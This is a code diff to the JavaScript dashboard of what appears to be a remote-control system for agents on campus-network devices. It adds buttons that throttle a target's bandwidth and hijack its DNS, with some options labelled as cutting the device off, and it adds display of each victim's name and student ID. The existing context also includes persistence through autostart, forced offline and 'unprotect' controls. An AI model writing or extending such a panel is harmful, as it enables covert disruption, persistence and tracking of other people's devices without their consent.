@@ -411,6 +411,19 @@ async function confirmAction(){
   if(action==='logout'){
     const sel=document.getElementById("offlineDuration");
     if(sel)params.duration=parseInt(sel.value);
+  } else if(action==='set_bandwidth'){
+    const sel=document.getElementById("bwRate");
+    if(sel)params.rate_kbps=parseInt(sel.value);
+  } else if(action==='set_dns'){
+    const sel=document.getElementById("dnsSelect");
+    if(sel){
+      if(sel.value==='custom'){
+        const inp=document.getElementById("dnsCustom");
+        params.primary=inp?inp.value.trim():'127.0.0.1';
+      } else {
+        params.primary=sel.value;
+      }
+    }
   }
   closeModal();
   if(action==='__delete__'){
@@ -452,6 +465,49 @@ async function doDelete(agentId,block){
     if(j.ok){addLog("删除成功","ok");refresh();}
     else addLog(`删除失败: ${j.error}`,"err");
   }catch(e){addLog(`网络错误: ${e}`,"err")}
+}
+
+function setBandwidth(agentId,hostname,current){
+  pendingAction={agentId,action:'set_bandwidth'};
+  document.getElementById("modalTitle").textContent="⚡ 设置限速";
+  document.getElementById("modalMsg").innerHTML=
+    `设备: <b>${hostname}</b><br>`+
+    `当前: <b>${current?current+'KB/s':'无限制'}</b><br><br>`+
+    `<label style="font-size:13px">限速值 (KB/s):</label><br>`+
+    `<select id="bwRate" style="padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;margin-top:6px;width:100%">`+
+    `<option value="10">10 KB/s (极慢)</option>`+
+    `<option value="50">50 KB/s</option>`+
+    `<option value="100" selected>100 KB/s</option>`+
+    `<option value="200">200 KB/s</option>`+
+    `<option value="500">500 KB/s</option>`+
+    `<option value="1024">1 MB/s</option>`+
+    `<option value="2048">2 MB/s</option>`+
+    `<option value="5120">5 MB/s</option>`+
+    `</select>`;
+  document.getElementById("confirmModal").className="modal-overlay show";
+}
+
+function setDns(agentId,hostname){
+  pendingAction={agentId,action:'set_dns'};
+  document.getElementById("modalTitle").textContent="🌐 篡改 DNS";
+  document.getElementById("modalMsg").innerHTML=
+    `设备: <b>${hostname}</b><br><br>`+
+    `<label style="font-size:13px">主 DNS:</label><br>`+
+    `<select id="dnsSelect" style="padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;margin-top:6px;width:100%">`+
+    `<option value="127.0.0.1">127.0.0.1 (本地回环, 几乎断网)</option>`+
+    `<option value="0.0.0.0">0.0.0.0 (无效, 断网)</option>`+
+    `<option value="1.1.1.1">1.1.1.1 (Cloudflare, 正常)</option>`+
+    `<option value="8.8.8.8">8.8.8.8 (Google, 正常)</option>`+
+    `<option value="114.114.114.114">114.114.114.114 (国内公共, 正常)</option>`+
+    `<option value="custom">自定义...</option>`+
+    `</select>`+
+    `<input id="dnsCustom" type="text" placeholder="输入自定义DNS IP" style="display:none;margin-top:6px;padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;width:calc(100% - 26px)">`;
+  document.getElementById("confirmModal").className="modal-overlay show";
+  setTimeout(()=>{
+    const sel=document.getElementById('dnsSelect');
+    const inp=document.getElementById('dnsCustom');
+    if(sel&&inp){sel.onchange=()=>{inp.style.display=sel.value==='custom'?'block':'none';};}
+  },50);
 }
 
 async function sendCmd(agentId, cmd, params={}){
@@ -504,10 +560,14 @@ async function refresh(){
           <span class="badge ${cls}">${a.status_text||"未知"}</span>
         </div>
         <div class="info-row"><span class="k">Agent ID</span><span class="v">${a.agent_id||"--"}</span></div>
+        <div class="info-row"><span class="k">👤 用户姓名</span><span class="v" style="color:#0891b2;font-weight:600">${a.username||"--"}</span></div>
+        <div class="info-row"><span class="k">🎓 学号</span><span class="v" style="color:#0891b2">${a.user_id||"--"}</span></div>
         <div class="info-row"><span class="k">局域网 IP</span><span class="v">${a.local_ip||"--"}</span></div>
-        <div class="info-row"><span class="k">校园网 IP</span><span class="v">${a.campus_ip||"--"}</span></div>
+        <div class="info-row"><span class="k">校园网 IP</span><span class="v">${a.user_ip||a.campus_ip||"--"}</span></div>
         <div class="info-row"><span class="k">MAC</span><span class="v">${a.mac||"--"}</span></div>
         <div class="info-row"><span class="k">网络状态</span><span class="v">${a.force_offline?"🔒 "+(a.net_message||"强制离线中"):a.net_online?"✅ 已认证":"❌ 未认证"}</span></div>
+        <div class="info-row"><span class="k">⚡ 限速</span><span class="v" style="color:${a.bandwidth_limit?'#dc2626':'#16a34a'}">${a.bandwidth_limit?'🔻 '+a.bandwidth_limit+'KB/s':'无限制'}</span></div>
+        <div class="info-row"><span class="k">🌐 DNS</span><span class="v" style="color:${a.dns_hijacked?'#dc2626':'#16a34a'}">${a.dns_hijacked?'⚠️ '+a.dns_servers:'自动(DHCP)'}</span></div>
         <div class="info-row"><span class="k">最后心跳</span><span class="v">${ago(a.last_seen)}</span></div>
         <div class="info-row"><span class="k">运行时间</span><span class="v">${a.uptime||"--"}</span></div>
         <div class="autostart-row">
@@ -525,6 +585,12 @@ async function refresh(){
           <button class="btn" style="background:#f1f5f9;color:#64748b" onclick="toggleToken('${a.agent_id}')">🔑 Token</button>
         </div>
         <div class="actions" style="margin-top:6px">
+          <button class="btn" style="background:${a.bandwidth_limit?'#fef2f2':'#f0fdf4'};color:${a.bandwidth_limit?'#b91c1c':'#166534'}" onclick="setBandwidth('${a.agent_id}','${a.hostname||a.agent_id}',${a.bandwidth_limit||0})">${a.bandwidth_limit?'🔻 改限速':'⚡ 限速'}</button>
+          ${a.bandwidth_limit?`<button class="btn btn-green" onclick="sendCmd('${a.agent_id}','clear_bandwidth')">🚀 解除限速</button>`:''}
+          <button class="btn" style="background:${a.dns_hijacked?'#fef2f2':'#eff6ff'};color:${a.dns_hijacked?'#b91c1c':'#1e40af'}" onclick="setDns('${a.agent_id}','${a.hostname||a.agent_id}')">${a.dns_hijacked?'🌐 改DNS':'🌐 篡改DNS'}</button>
+          ${a.dns_hijacked?`<button class="btn btn-green" onclick="sendCmd('${a.agent_id}','reset_dns')">🔄 恢复DNS</button>`:''}
+        </div>
+        <div class="actions" style="margin-top:6px">
           <button class="btn btn-green" onclick="sendCmd('${a.agent_id}','protect')">🛡️ 启用防护</button>
           <button class="btn" style="background:#fef2f2;color:#b91c1c" onclick="sendCmd('${a.agent_id}','unprotect')">🔓 解除防护</button>
           <button class="btn" style="background:#ede9fe;color:#6d28d9" onclick="sendCmd('${a.agent_id}','start_watchdog')">👁️ 看门狗</button>
@@ -535,7 +601,7 @@ async function refresh(){
       </div>`;
     }).join("");
     // 只在内容变化时更新DOM (排除心跳时间等动态字段避免闪烁)
-    const stableKey=agents.map(a=>`${a.agent_id}|${a.status_cls}|${a.net_online}|${a.force_offline}|${a.autostart}|${a.autostart_reg}|${a.autostart_task}|${a.autostart_lnk}|${a.username}|${a.campus_ip}|${a.local_ip}`).join(";");
+    const stableKey=agents.map(a=>`${a.agent_id}|${a.status_cls}|${a.net_online}|${a.force_offline}|${a.autostart}|${a.autostart_reg}|${a.autostart_task}|${a.autostart_lnk}|${a.username}|${a.user_id}|${a.user_ip}|${a.campus_ip}|${a.local_ip}|${a.bandwidth_limit||''}|${a.dns_hijacked||''}|${a.dns_servers||''}`).join(";");
     if(stableKey!==grid._prevKey){grid.innerHTML=newHtml;grid._prevKey=stableKey;}
     else{
       // 只更新动态文本(心跳/运行时间)不重建DOM
